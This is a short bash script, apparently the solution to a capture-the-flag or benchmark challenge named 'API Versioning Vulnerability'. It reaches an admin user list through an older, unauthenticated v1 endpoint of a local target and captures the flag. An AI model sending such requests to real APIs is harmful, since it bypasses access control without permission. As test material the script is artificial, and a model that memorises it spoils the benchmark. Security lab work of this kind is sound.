#!/usr/bin/env bash
# APEX-030-25 — "API Versioning Vulnerability" (tags: api, authorization)
#
# The current API checks a token and then a role. Two older versions are still
# mounted for backward compatibility, and `v1` was written before either check
# existed. Nothing was removed; the authorization was added alongside it. So
# `/api/v1/admin/users` returns what `/api/v3/admin/users` refuses.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex030-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/api/v3/products" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --set path=/api/v1/admin/users | flag
